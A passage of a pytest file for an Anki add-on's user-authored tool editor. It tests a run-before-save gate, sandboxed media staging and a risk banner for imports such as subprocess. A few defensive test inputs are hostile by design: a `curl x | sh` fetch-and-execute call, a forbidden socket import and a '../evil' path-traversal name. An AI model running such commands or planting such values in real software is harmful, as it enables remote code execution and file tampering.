"""Tests for the Tools tab: the authoring gate, the delete warning, and the page it lives in.

The controller is the thing that has to hold the safety story, so that is what is asserted
here: ``user_tool_save`` refuses a source the user has not RUN (the disabled Save button is a
courtesy, this is the rule), the authoring prompt survives the round trip to disk and back, and
a delete names the fields it would leave pointing at nothing. The page assertions cover the one
thing only the built HTML can prove — that the tab, its hooks and its "these do not sync"
statement are actually rendered.

Same harness as ``test_smart_notes_dialog_deps``: a tiny fake context and a synchronous stand-in
for ``run_in_background``, so no Qt stack and no real dialog. Every tool file is written under
``tmp_path``.
"""

from __future__ import annotations

import json
import pathlib
import re
import shutil
import subprocess
import sys
import types
from typing import Any

import pytest

# --- stub the extra aqt symbols the dialogs package imports at module load ----------------
_theme_mod = types.ModuleType("aqt.theme")
_theme_mod.theme_manager = types.SimpleNamespace(night_mode=False)
sys.modules.setdefault("aqt.theme", _theme_mod)

_qt = sys.modules.get("aqt.qt") or types.ModuleType("aqt.qt")
for _name in (
    "QCloseEvent",
    "QComboBox",
    "QDialog",
    "QDialogButtonBox",
    "QLabel",
    "QPlainTextEdit",
    "QPushButton",
    "Qt",
    "QVBoxLayout",
    "QWebEngineView",
    "QWidget",
):
    if not hasattr(_qt, _name):
        setattr(_qt, _name, type(_name, (), {}))
sys.modules["aqt.qt"] = _qt
import aqt  # noqa: E402  (the conftest stub package)

aqt.qt = _qt
aqt.theme = _theme_mod

_webview_mod = types.ModuleType("aqt.webview")
_webview_mod.AnkiWebView = type("AnkiWebView", (), {})
sys.modules.setdefault("aqt.webview", _webview_mod)
aqt.webview = _webview_mod

from omnia.core import anki_compat  # noqa: E402
from omnia.gui.smart_notes.dialogs.controllers.user_tools import (  # noqa: E402
    UserToolsController,
)
from omnia.gui.smart_notes.html import build_smart_notes_html  # noqa: E402
from omnia.plugins.smart_notes.config import (  # noqa: E402
    FieldToolConfig,
    SmartNotesFieldConfig,
    SmartNotesNoteTypeConfig,
    SmartNotesSettings,
)
from omnia.plugins.smart_notes.engine.tools import (  # noqa: E402
    INPUT_KIND_EXTENSIONS,
    TOOL_REGISTRY,
    UserToolLoader,
    UserToolSource,
    UserToolStore,
    get_tool,
)
from omnia.plugins.smart_notes.engine.tools.media_sample import (  # noqa: E402
    media_family,
)

_TOOL_SOURCE = '''
from typing import ClassVar

from pydantic import Field

from omnia.core.config.base import PersistedModel
from omnia.plugins.smart_notes.engine.generators import GenerationResult
from omnia.plugins.smart_notes.engine.tools import Produced, Tool, register_tool


class ExtParams(PersistedModel):
    source_field: str = Field("", description="Field holding the filename.")


@register_tool("user:ext")
class ExtTool(Tool):
    """Upper-cases the sample."""

    name: ClassVar[str] = "user:ext"
    label: ClassVar[str] = "Extract extension"
    description: ClassVar[str] = "Output just the file extension."
    kinds: ClassVar[frozenset] = frozenset({"text"})
    deterministic: ClassVar[bool] = True
    params_model: ClassVar[type] = ExtParams

    def run(self, request, ctx):
        value = str(request.fields.get("Sample", ""))
        return Produced(GenerationResult("text", text=value.rsplit(".", 1)[-1]))
'''


def _fake_ctx(**overrides: Any) -> types.SimpleNamespace:
    """A minimal stand-in for ``SmartNotesContext`` (only what this controller touches)."""
    ctx = types.SimpleNamespace(
        eval_js=lambda js: None,
        build_hub=lambda: None,
        friendly=lambda exc, prefix: f"{prefix}: {exc}",
        settings=lambda: SmartNotesSettings(),
    )
    for key, value in overrides.items():
        setattr(ctx, key, value)
    return ctx


@pytest.fixture
def registry_guard():
    """Restore the tool registry after a test that loads tools into it."""
    before = dict(TOOL_REGISTRY)
    yield
    TOOL_REGISTRY.clear()
    TOOL_REGISTRY.update(before)


@pytest.fixture
def sync_background(monkeypatch):
    """Run ``run_in_background`` inline so an off-thread op resolves within the test."""

    def fake_run(op, *, on_success, on_failure=None, label=None, parent=None):
        try:
            result = op()
        except Exception as exc:  # mirror QueryOp's failure branch
            if on_failure is None:
                raise
            on_failure(exc)
            return
        on_success(result)

    monkeypatch.setattr(anki_compat, "run_in_background", fake_run)


@pytest.fixture
def store(tmp_path):
    """The throwaway tools folder every test writes into."""
    return UserToolStore(tmp_path / "tools")


@pytest.fixture
def controller(store, registry_guard, sync_background):
    """A controller over the throwaway folder, plus its fake context and the JS it pushed."""
    pushed: list[str] = []
    ctx = _fake_ctx(eval_js=pushed.append)
    return UserToolsController(ctx, loader=UserToolLoader(store)), ctx, pushed


def _test_run(controller_tuple, source: str = _TOOL_SOURCE) -> dict:
    """Run the test op the way the page does, returning the pushed result payload."""
    controller, _ctx, pushed = controller_tuple
    controller.on_test(
        {"slug": "ext", "source": source, "inputs": {"Sample": "clip.mp3"}}
    )
    return json.loads(
        pushed[-1].split("window.__snUserToolTested(", 1)[1][:-2].split(", ", 1)[1]
    )


def _strip_js_comments(source: str) -> str:
    """Return ``source`` with ``/* … */`` blocks AND ``//`` line comments removed.

    ``10-usertools.js`` is dense with JSDoc blocks that already contain every phrase a lazy
    assertion would grep for — "file", "sample", "staged", "reference", "audio", even the id of
    an element the page no longer has. A negative assertion run against the raw text therefore
    fails on prose, and an ordering assertion can find its tokens inside a comment. Blocks are
    stripped first, then lines, because a block comment can contain a ``//``.
    """
    without_blocks = re.sub(r"/\*.*?\*/", "", source, flags=re.DOTALL)
    return "\n".join(
        line.split("//")[0] if "//" in line else line
        for line in without_blocks.splitlines()
    )


def _strip_css_comments(source: str) -> str:
    """Return ``source`` with ``/* … */`` blocks removed.

    Same reason as :func:`_strip_js_comments`: this stylesheet explains WHY a declaration is
    absent, naming it, so an assertion that greps the prose passes on its own comment.
    """
    return re.sub(r"/\*.*?\*/", "", source, flags=re.DOTALL)


def _js(html: str, marker: str, length: int = 1400) -> str:
    """The slice of the built page starting at ``marker`` (a function/handler to inspect).

    Scoped rather than grepping the whole 7,800-line bundle: a token asserted against the full
    page proves only that SOMETHING in Smart Notes contains it.
    """
    start = html.index(marker)
    return html[start : start + length]


#: Where the page's own JS is actually executed (see
#: :class:`TestTheKindDecidesTheControlAndTheRendering`). Present on every CI runner and on a
#: normal dev machine; the class skips rather than fails where it is not, because a missing
#: JavaScript engine is not a defect in this add-on.
_NODE = shutil.which("node")

#: The smallest DOM the Try-it renderers need, plus recorders for the collaborators they call.
#: Deliberately not a DOM library: these functions use ``createElement``, four properties and
#: ``appendChild``, and a dependency that has to be installed would make the pin skippable in
#: exactly the environments that most need it.
_DOM_HARNESS = """
'use strict';
function makeElement(tag) {
  const el = {
    tagName: tag,
    className: "",
    textContent: "",
    title: "",
    type: "",
    value: "",
    rows: 0,
    hidden: false,
    attributes: {},
    children: [],
    listeners: {},
    setAttribute: function (name, value) { el.attributes[name] = value; },
    appendChild: function (child) { el.children.push(child); return child; },
    addEventListener: function (name, handler) {
      (el.listeners[name] = el.listeners[name] || []).push(handler);
    }
  };
  Object.defineProperty(el, "innerHTML", {
    get: function () { return ""; },
    set: function () { el.children.length = 0; }
  });
  return el;
}

const document = {createElement: makeElement};
const utOutMediaEl = makeElement("div");
const utInputsEl = makeElement("div");
const utSourceEl = makeElement("textarea");
let utInputs = [];

// The bridge, answering synchronously with whatever the scenario staged.
let sendReply = {};
function send(op, payload, callback) { callback(sendReply); }

// The collaborators the renderers reach for. Recorded rather than run: what is under test is
// WHICH one a kind reaches for, not what it then does (that is covered on the Python side).
const calls = [];
function pickInputFile(field, kind) { calls.push(["pickInputFile", field, kind]); }
function openLightbox(src) { calls.push(["openLightbox", src]); }
function playToolOutput() { calls.push(["playToolOutput"]); }
function openVideoPopup(media) { calls.push(["openVideoPopup", media.kind]); }

function describe(el) {
  return {
    tag: el.tagName,
    className: el.className,
    text: el.textContent,
    title: el.title,
    value: el.value,
    attrs: el.attributes,
    children: el.children.map(describe)
  };
}

function clickAll(el) {
  (el.listeners.click || []).forEach(function (handler) { handler({}); });
  el.children.forEach(clickAll);
}

const out = {};
function scenario(name, body) {
  calls.length = 0;
  const result = body();
  result.calls = calls.slice();
  out[name] = result;
}

function entryFor(field, kind, value, name) {
  return {field: field, kind: kind, value: value, name: name, valueEl: null, fileEl: null};
}
"""

#: The states the two renderers are asked about. One node run answers all of them.
_SCENARIOS = """
scenario("text_row", function () {
  const row = toolInputRow(entryFor("Sentence", "text", "hello", ""));
  clickAll(row);
  return {dom: describe(row)};
});

scenario("audio_row", function () {
  const row = toolInputRow(entryFor("Clip", "audio", "", ""));
  clickAll(row);
  return {dom: describe(row)};
});

scenario("staged_row", function () {
  return {dom: describe(toolInputRow(entryFor("Clip", "audio", "[sound:take.wav]", "take.wav")))};
});

scenario("rebuild_keeps_the_pick", function () {
  renderToolInputs([{field: "Clip", kind: "audio"}]);
  utInputs[0].value = "[sound:take.wav]";
  utInputs[0].name = "take.wav";
  renderToolInputs([{field: "Clip", kind: "audio"}]);
  return {dom: describe(utInputsEl.children[0]), value: utInputs[0].value};
});

scenario("rebuild_only_when_the_form_changes", function () {
  renderToolInputs([{field: "Clip", kind: "audio"}]);
  const row = utInputsEl.children[0];
  sendReply = {inputs: [{field: "Clip", kind: "audio"}]};
  refreshInputsFromEditor();
  const kept = utInputsEl.children[0] === row;
  sendReply = {inputs: [{field: "Clip", kind: "text"}]};
  refreshInputsFromEditor();
  return {kept: kept, rebuilt: utInputsEl.children[0] !== row};
});

scenario("image_output", function () {
  renderToolOutput({kind: "image", name: "t.png", size: 12,
                    image: "data:image/png;base64,AA", note: ""});
  clickAll(utOutMediaEl);
  return {dom: describe(utOutMediaEl)};
});

scenario("audio_output", function () {
  renderToolOutput({kind: "audio", name: "t.mp3", size: 12, playable: true, note: ""});
  clickAll(utOutMediaEl);
  return {dom: describe(utOutMediaEl)};
});

scenario("video_output", function () {
  renderToolOutput({kind: "video", name: "t.mp4", size: 12, playable: true, note: ""});
  clickAll(utOutMediaEl);
  return {dom: describe(utOutMediaEl)};
});

scenario("unviewable_output", function () {
  renderToolOutput({kind: "image", name: "t.png", size: 99, note: "too large to preview here."});
  clickAll(utOutMediaEl);
  return {dom: describe(utOutMediaEl)};
});

console.log(JSON.stringify(out));
"""

#: The page functions the scenarios exercise — lifted from the BUILT page, so what runs here is
#: what ships, not a copy.
_RENDERERS = (
    "function renderToolInputs(",
    "function refreshInputsFromEditor(",
    "function sameToolInputs(",
    "function toolInputRow(",
    "function pickRowButton(",
    "function showInputFile(",
    "function renderToolOutput(",
    "function utOutButton(",
)


def _tags(node: dict, tag: str) -> list[dict]:
    """Every descendant of ``node`` (and ``node``) with that tag name."""
    found = [node] if node["tag"] == tag else []
    for child in node["children"]:
        found.extend(_tags(child, tag))
    return found


def _text(node: dict) -> str:
    """All the text ``node``'s tree renders, joined."""
    return " ".join(
        [node["text"]] + [_text(child) for child in node["children"]]
    ).strip()


def _caption(row: dict) -> str:
    """The ``.sn-ut-input-file`` line of one input row: what file it will be read as."""
    return next(
        child["text"]
        for child in row["children"]
        if child["className"] == "sn-ut-input-file"
    )


@pytest.fixture(scope="module")
def rendered(tmp_path_factory) -> dict:
    """Run the BUILT page's own Try-it renderers in node, and return what each one built.

    One node process for every scenario: the page is assembled once, the renderers are lifted
    out of it once, and the answers are read back as JSON.
    """
    html = build_smart_notes_html(dark=False, init={}, catalog={}, tools=[])
    sources = "\n".join(_js_function(html, marker) for marker in _RENDERERS)
    script = tmp_path_factory.mktemp("js") / "renderers.js"
    script.write_text(_DOM_HARNESS + sources + _SCENARIOS, encoding="utf-8")

    finished = subprocess.run(
        [_NODE, str(script)], capture_output=True, text=True, check=False
    )

    assert finished.returncode == 0, finished.stderr
    return json.loads(finished.stdout)


def _js_function(html: str, marker: str) -> str:
    """The WHOLE function/handler starting at ``marker``, found by balancing its braces.

    :func:`_js` takes a fixed number of characters, so a comment added inside the function
    silently pushes the line an assertion is looking for out of the window and the test fails
    for a reason that has nothing to do with the behaviour. This ends where the function does.
    """
    start = html.index(marker)
    depth = 0
    opened = False
    for index in range(start, len(html)):
        char = html[index]
        if char == "{":
            depth += 1
            opened = True
        elif char == "}":
            depth -= 1
            if opened and depth == 0:
                return html[start : index + 1]
    raise AssertionError(f"unbalanced braces after {marker!r}")


class TestSaveNeedsATestRun:
    """The one rule that makes generated code acceptable: it is never saved unseen."""

    def test_save_is_refused_before_any_test_run(self, controller):
        ctrl, _ctx, _pushed = controller

        result = ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": "p"})

        assert "Run the tool on a sample first" in result["error"]
        assert ctrl.on_list({})["tools"] == []

    def test_save_is_allowed_after_the_source_has_run(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)

        result = ctrl.on_save({"slug": "ext", "source": _TOOL_SOURCE, "prompt": "p"})

        assert result["ok"] is True
        assert result["name"] == "user:ext"
        assert get_tool("user:ext") is not None

    def test_editing_the_source_after_the_test_re_arms_the_gate(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)

        result = ctrl.on_save(
            {"slug": "ext", "source": _TOOL_SOURCE + "\n# edited\n", "prompt": "p"}
        )

        assert "Run the tool on a sample first" in result["error"]

    def test_a_test_run_that_fails_still_counts_as_seen(self, controller):
        # The user watched it break; saving a tool that breaks is their call, and the source
        # they save is the source they watched.
        ctrl, _ctx, _pushed = controller
        broken = _TOOL_SOURCE.replace(
            'value = str(request.fields.get("Sample", ""))', 'raise ValueError("kaput")'
        )
        result = _test_run(controller, broken)

        assert result["status"] == "error"
        assert (
            ctrl.on_save({"slug": "ext", "source": broken, "prompt": ""})["ok"] is True
        )

    def test_a_source_that_does_not_compile_is_not_marked_tested(self, controller):
        # `import os` is allowed now, so the refusal has to come from a source that is still
        # genuinely unusable — one that registers no tool at all.
        ctrl, _ctx, pushed = controller
        broken = "import socket\n"

        ctrl.on_test({"slug": "ext", "source": broken, "sample": ""})

        assert "may not import 'socket'" in pushed[-1]
        assert "error" in ctrl.on_save({"slug": "ext", "source": broken})

    def test_testing_reports_the_output_the_user_sees(self, controller):
        result = _test_run(controller)

        assert result["ok"] is True
        assert result["output"] == "mp3"


class TestPersistence:
    def test_the_authoring_prompt_round_trips(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)
        ctrl.on_save(
            {"slug": "ext", "source": _TOOL_SOURCE, "prompt": "take the extension"}
        )

        listed = ctrl.on_list({})["tools"]

        assert [tool["slug"] for tool in listed] == ["ext"]
        assert listed[0]["prompt"] == "take the extension"
        assert listed[0]["source"].strip().startswith("from typing import")
        assert listed[0]["label"] == "Extract extension"

    def test_the_list_carries_the_builtins_and_the_folder(self, controller):
        ctrl, _ctx, _pushed = controller

        payload = ctrl.on_list({})

        names = [tool["name"] for tool in payload["builtins"]]
        assert "ai" in names and "cloze" in names
        assert all(not name.startswith("user:") for name in names)
        assert payload["directory"].endswith("tools")

    def test_a_broken_file_is_listed_with_its_error(self, controller, store):
        ctrl, _ctx, _pushed = controller
        store.write(
            UserToolSource(slug="broken", code='raise RuntimeError("explodes")\n')
        )

        listed = ctrl.on_list({})["tools"]

        assert listed[0]["slug"] == "broken"
        assert "explodes" in listed[0]["error"]
        assert listed[0]["loaded"] is False

    def test_a_name_that_is_not_a_slug_is_refused(self, controller):
        ctrl, _ctx, _pushed = controller

        result = ctrl.on_save({"slug": "../evil", "source": _TOOL_SOURCE})

        assert "not a usable tool name" in result["error"]

    def test_a_label_is_slugified_when_no_slug_is_posted(self, controller):
        ctrl, _ctx, _pushed = controller
        _test_run(controller)

        result = ctrl.on_save(
            {"label": "Extract Extension!", "source": _TOOL_SOURCE, "prompt": ""}
        )

        # The source registers "user:ext", so the derived slug must NOT match: the failure is
        # reported instead of a file being written under a name nothing registers.
        assert "could not be loaded" in result["error"]
        assert result.get("ok") is None


class TestTheTestRunIsRepresentative:
    """The dialog's Test must give a tool the same context generation will.

    Two constructors build a ToolContext. Wiring one and forgetting the other meant a tool that
    reads media declined on every Test — on a machine with the collection wide open — and the
    gate marks a decline as "seen", so Save unlocked for a tool the user had never watched do
    its job. The end-to-end check that missed this drove UserToolLoader directly; this drives
    the dialog.
    """

    def test_the_test_context_never_points_at_the_live_collection(
        self, controller, monkeypatch, tmp_path
    ):
        """A test run executes arbitrary code that may open files for WRITING.

        Pointing it at the real media folder makes pressing Run destructive: a tool that
        writes its output back over its input truncates the user's own file, and the review
        gate REQUIRES pressing Run. So a test resolves media only against the stage, whose
        contents are copies.
        """
        ctrl, _ctx, _pushed = controller
        monkeypatch.setattr(
            "omnia.core.anki_compat.media_dir", lambda col=None: "/collection/media"
        )

        assert ctrl._tool_context().media_dir() != "/collection/media"
        assert ctrl._tool_context().media_dir() == ""  # nothing staged yet

        chosen = tmp_path / "clip.mp4"
        chosen.write_bytes(b"x")
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(chosen)
        )
        ctrl.on_pick_sample({"field": "Clip", "kind": "video"})

        # …and once a file is picked, it resolves — against the copy, not the original.
        staged = ctrl._tool_context().media_dir()
        assert staged and staged != "/collection/media"
        assert (pathlib.Path(staged) / "clip.mp4").exists()

    def test_generation_still_uses_the_real_collection(self, monkeypatch):
        # The safety narrowing is for the TEST path only. A real run must see real media.
        from omnia.plugins.smart_notes.engine.tools import resolve_media_dir

        monkeypatch.setattr(
            "omnia.core.anki_compat.media_dir", lambda col=None: "/collection/media"
        )

        assert resolve_media_dir() == "/collection/media"

    def test_the_two_contexts_differ_on_purpose(self):
        """Generation sees the real collection; a TEST sees only the stage.

        They used to be required to match, and that was right while both were the same kind of
        run. They are not: a test executes code the user has not finished reviewing, so its
        media folder is a temp copy and the user's own files are out of reach. Generation runs
        code already read and saved, against the real collection, which is the point.

        The shared resolver still exists and is still the ONE way the real folder is found — it
        is simply not what the test path uses.
        """
        import omnia.plugins.smart_notes.engine.service as service
        from omnia.plugins.smart_notes.engine.tools import resolve_media_dir

        assert service.resolve_media_dir is resolve_media_dir


class TestTheWarningPrecedesTheRun:
    """Every path that ends in Run must show the tool's reach BEFORE it runs.

    Run executes the module, and the review gate requires pressing it — so a summary that only
    arrives with the test RESULT describes something that already happened. The generate path
    was fixed first; the EDIT path is the one a user takes with code they did not just watch
    being written.
    """

    def test_listing_a_saved_tool_carries_its_risks(self, controller, store):
        # The edit path renders from this payload. An empty banner over `import subprocess`
        # affirmatively says "only reshapes text", which is the opposite of true.
        ctrl, _ctx, _pushed = controller
        store.write(
            UserToolSource(
                slug="risky",
                code="import subprocess\n@register_tool('user:risky')\nclass T: pass\n",
            )
        )

        payload = ctrl.on_list({})
        listed = {tool["slug"]: tool for tool in payload["tools"]}["risky"]

        assert "runs other programs on your computer" in listed["risks"]

    def test_a_text_only_saved_tool_lists_no_risks(self, controller, store):
        ctrl, _ctx, _pushed = controller
        store.write(UserToolSource(slug="plain", code="import re\n"))

        payload = ctrl.on_list({})
        listed = {tool["slug"]: tool for tool in payload["tools"]}["plain"]

        assert listed["risks"] == []

    def test_the_editor_can_recompute_risks_for_pasted_source(self, controller):
        # Pasting a different tool over this one changes what Run will execute, so the banner
        # has to follow the text in the box rather than whatever arrived with it.
        ctrl, _ctx, _pushed = controller

        result = ctrl.on_risks({"source": "import os\n"})

        assert "run other programs" in result["risks"][0]
        assert ctrl.on_risks({"source": "import re\n"})["risks"] == []

    def test_os_is_not_described_as_filesystem_only(self, controller):
        """`os.system` and `os.popen` run programs.

        The prompt tells the model "pathlib, subprocess and the rest are available", which makes
        `os.system(f"ffmpeg …")` a likely generation — and a reviewer who has learned that "runs
        other programs on your computer" is how that reads would otherwise conclude this tool
        does not.
        """
        ctrl, _ctx, _pushed = controller

        risks = ctrl.on_risks({"source": "import os\nos.system('curl x | sh')\n"})[
            "risks"
        ]

        assert any("run other programs" in risk for risk in risks)


_AUDIO_PICK = {"field": "Clip", "kind": "audio"}


class TestTheInputForm:
    """What the Try-it panel offers is read from the DRAFT, and read without running it.

    The tool is what knows which fields it reads and what each one holds, so the form is derived
    from its source rather than being one undifferentiated box. It has to be derived by READING,
    though: compiling means ``exec``, and execution in this flow happens exactly once — on Run,
    after the risk banner. Building a form before Run by compiling would put arbitrary execution
    ahead of the review that exists to precede it.
    """

    def test_the_declared_inputs_are_returned_for_a_draft_source(self, controller):
        ctrl, _ctx, _pushed = controller
        source = _TOOL_SOURCE.replace(
            "    params_model: ClassVar[type] = ExtParams",
            "    params_model: ClassVar[type] = ExtParams\n"
            '    input_kinds = {"Clip": "audio", "Word": "text"}',
        )

        payload = ctrl.on_inputs({"source": source})

        assert payload["inputs"] == [
            {"field": "Clip", "kind": "audio"},
            {"field": "Word", "kind": "text"},
        ]

    def test_a_tool_declaring_nothing_gets_one_text_input(self, controller):
        # Exactly the panel every tool authored before this change was tested with.
        ctrl, _ctx, _pushed = controller

        payload = ctrl.on_inputs({"source": _TOOL_SOURCE})

        assert payload["inputs"] == [{"field": "Sample", "kind": "text"}]

    def test_asking_for_the_inputs_never_runs_the_code(self, controller, tmp_path):
        ctrl, _ctx, _pushed = controller
        sentinel = tmp_path / "ran"
        source = (
            "import pathlib\n"
            f"pathlib.Path({str(sentinel)!r}).write_text('yes')\n" + _TOOL_SOURCE
        )

        ctrl.on_inputs({"source": source})

        assert not sentinel.exists()
        # …and the sentinel is live: the SAME source writes it when the tool is actually run.
        _test_run(controller, source)
        assert sentinel.read_text() == "yes"


class TestTheMediaSample:
    """Testing a tool that reads a FILE.

    Typing `[sound:x.mp3]` by hand only works if x.mp3 is already in the collection — exactly
    what someone testing a NEW conversion does not have. So a media input is a file the user
    picks, staged OUTSIDE the collection with the test's media folder pointed at the stage: the
    reference resolves, the tool reads a real file, and nothing is added to synced media.
    """

    def test_picking_a_file_returns_the_reference_and_stages_it(
        self, controller, monkeypatch, tmp_path
    ):
        ctrl, _ctx, _pushed = controller
        chosen = tmp_path / "clip.mp4"
        chosen.write_bytes(b"data")
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(chosen)
        )

        result = ctrl.on_pick_sample({"field": "Clip", "kind": "video"})

        assert result["reference"] == "[sound:clip.mp4]"
        assert result["name"] == "clip.mp4"
        # …and the tool under test resolves that reference against the stage.
        staged = pathlib.Path(ctrl._tool_context().media_dir()) / "clip.mp4"
        assert staged.read_bytes() == b"data"

    def test_the_picker_is_filtered_to_the_input_kind(self, controller, monkeypatch):
        # A picker that offers every file for an input the tool told us is audio is the same
        # undifferentiated box this change exists to remove.
        ctrl, _ctx, _pushed = controller
        seen: dict = {}
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **kw: seen.update(kw) or ""
        )

        ctrl.on_pick_sample(_AUDIO_PICK)

        assert "*.mp3" in seen["file_filter"]
        assert "*.wav" in seen["file_filter"]
        # …and the escape hatch is always last: a filter that hides the right file is worse
        # than no filter at all.
        assert seen["file_filter"].endswith("All files (*)")
        assert "Clip" in seen["title"]

    def test_the_image_filter_offers_everything_this_addon_calls_a_picture(
        self, controller, monkeypatch
    ):
        """The picker's filter and the classifier read the SAME table.

        They were written out separately and drifted: the filter listed six extensions while
        the classifier called ten of them pictures, so a user whose scans are .bmp or .tiff
        opened the picker on their media folder and saw an empty directory.
        """
        ctrl, _ctx, _pushed = controller
        seen: dict = {}
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **kw: seen.update(kw) or ""
        )

        ctrl.on_pick_sample({"field": "Scan", "kind": "image"})

        for extension in INPUT_KIND_EXTENSIONS["image"]:
            assert f"*.{extension}" in seen["file_filter"], extension
            assert media_family(extension) == "image", extension

    def test_the_file_kind_offers_every_file(self, controller, monkeypatch):
        ctrl, _ctx, _pushed = controller
        seen: dict = {}
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **kw: seen.update(kw) or ""
        )

        ctrl.on_pick_sample({"field": "Any", "kind": "file"})

        assert seen["file_filter"] == "All files (*)"
        # …and the title does not promise a filtering that is not happening.
        assert seen["title"] == "Choose a file for Any"

    def test_a_text_input_can_be_handed_a_file_too(
        self, controller, monkeypatch, tmp_path
    ):
        """The per-row attach that replaced the standalone Choose-file button.

        A tool whose ``input_kinds`` cannot be read — absent, computed, or written before the
        declaration existed — renders as ONE text row. That row's own attach posts
        ``kind="file"`` and must stage exactly like a declared media input, or every media tool
        authored until now becomes impossible to test at all.
        """
        ctrl, _ctx, _pushed = controller
        chosen = tmp_path / "take.wav"
        chosen.write_bytes(b"data")
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(chosen)
        )

        result = ctrl.on_pick_sample({"field": "Sample", "kind": "file"})

        assert result["reference"] == "[sound:take.wav]"
        staged = pathlib.Path(ctrl._tool_context().media_dir()) / "take.wav"
        assert staged.read_bytes() == b"data"

    def test_an_unknown_kind_offers_every_file(self, controller, monkeypatch):
        ctrl, _ctx, _pushed = controller
        seen: dict = {}
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **kw: seen.update(kw) or ""
        )

        ctrl.on_pick_sample({"field": "Any", "kind": "hologram"})

        assert seen["file_filter"] == "All files (*)"

    def test_a_pick_with_no_field_is_refused(self, controller, monkeypatch):
        # A staged file needs a slot to live in and an input to be read as.
        ctrl, _ctx, _pushed = controller
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file",
            lambda **_k: pytest.fail("the picker must not open"),
        )

        assert "error" in ctrl.on_pick_sample({"kind": "audio"})

    def test_the_picker_still_opens_in_the_collection_media_folder(
        self, controller, monkeypatch, tmp_path
    ):
        # The interesting files are already there, and its real path is a per-platform profile
        # location the user has never needed to know.
        ctrl, _ctx, _pushed = controller
        seen: dict = {}
        monkeypatch.setattr(
            "omnia.core.anki_compat.media_dir", lambda col=None: "/collection/media"
        )
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file",
            lambda **kw: seen.update(kw) or "",
        )

        ctrl.on_pick_sample(_AUDIO_PICK)

        assert seen["start_dir"] == "/collection/media"

    def test_the_collection_is_never_written_to(
        self, controller, monkeypatch, tmp_path
    ):
        # The whole reason for staging: Anki SYNCS media, so a test that copied its sample in
        # would push it to every device — and pushing a deletion afterwards is no better.
        ctrl, _ctx, _pushed = controller
        collection = tmp_path / "collection.media"
        collection.mkdir()
        chosen = tmp_path / "outside.mp4"
        chosen.write_bytes(b"data")
        monkeypatch.setattr(
            "omnia.core.anki_compat.media_dir", lambda col=None: str(collection)
        )
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(chosen)
        )

        ctrl.on_pick_sample({"field": "Clip", "kind": "video"})

        assert list(collection.iterdir()) == []

    def test_picking_again_for_the_same_input_replaces_it(
        self, controller, monkeypatch, tmp_path
    ):
        # Otherwise a session accumulates a copy of everything the user browsed through.
        ctrl, _ctx, _pushed = controller
        first, second = tmp_path / "a.mp3", tmp_path / "b.mp3"
        first.write_bytes(b"1")
        second.write_bytes(b"2")

        monkeypatch.setattr("omnia.core.anki_compat.pick_file", lambda **_k: str(first))
        ctrl.on_pick_sample(_AUDIO_PICK)
        staged_first = pathlib.Path(ctrl._tool_context().media_dir()) / "a.mp3"
        assert staged_first.exists()

        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(second)
        )
        ctrl.on_pick_sample(_AUDIO_PICK)

        assert not staged_first.exists()
        assert (pathlib.Path(ctrl._tool_context().media_dir()) / "b.mp3").exists()

    def test_two_inputs_can_hold_files_at_once(self, controller, monkeypatch, tmp_path):
        """A tool reading a clip AND a picture must see both.

        Staging used to clear before every copy, so picking the second input's file deleted the
        first's and the tool then declined — on a panel that had just been told about both.
        """
        ctrl, _ctx, _pushed = controller
        clip, picture = tmp_path / "a.mp3", tmp_path / "b.png"
        clip.write_bytes(b"1")
        picture.write_bytes(b"2")

        monkeypatch.setattr("omnia.core.anki_compat.pick_file", lambda **_k: str(clip))
        ctrl.on_pick_sample(_AUDIO_PICK)
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(picture)
        )
        ctrl.on_pick_sample({"field": "Picture", "kind": "image"})

        directory = pathlib.Path(ctrl._tool_context().media_dir())
        assert (directory / "a.mp3").read_bytes() == b"1"
        assert (directory / "b.png").read_bytes() == b"2"

    def test_cancelling_changes_nothing(self, controller, monkeypatch):
        ctrl, _ctx, _pushed = controller
        monkeypatch.setattr("omnia.core.anki_compat.pick_file", lambda **_k: "")

        assert ctrl.on_pick_sample(_AUDIO_PICK) == {}

    def test_an_unreadable_file_reports_instead_of_raising(
        self, controller, monkeypatch, tmp_path
    ):
        ctrl, _ctx, _pushed = controller
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(tmp_path / "gone.mp4")
        )

        assert "error" in ctrl.on_pick_sample({"field": "Clip", "kind": "video"})

    def test_disposing_removes_the_staging_folder(
        self, controller, monkeypatch, tmp_path
    ):
        # Called from closeEvent: nothing staged for a test may outlive the dialog.
        ctrl, _ctx, _pushed = controller
        chosen = tmp_path / "c.mp3"
        chosen.write_bytes(b"x")
        monkeypatch.setattr(
            "omnia.core.anki_compat.pick_file", lambda **_k: str(chosen)
        )
        ctrl.on_pick_sample(_AUDIO_PICK)
        stage = pathlib.Path(ctrl._tool_context().media_dir())
        assert stage.exists()

        ctrl.dispose()

        assert not stage.exists()


def _media_tool(kind: str, ext: str, size: int = 8) -> str:
    """A tool source that produces ``size`` bytes of ``ext`` under generation kind ``kind``."""
    return _TOOL_SOURCE.replace(
        'kinds: ClassVar[frozenset] = frozenset({"text"})',
        f'kinds: ClassVar[frozenset] = frozenset({{"{kind}"}})',
    ).replace(
        'return Produced(GenerationResult("text", text=value.rsplit(".", 1)[-1]))',
        f'return Produced(GenerationResult("{kind}", data=b"x" * {size}, ext="{ext}"))',
    )


class TestTypedOutput:
    """A produced FILE is rendered as what it is, not described in a text box.

    The tester used to flatten bytes to "(tts: 55296 bytes of .mp3)" and let them die in the
    worker's closure, so "name + icon, click to play" was not expressible. They now ride
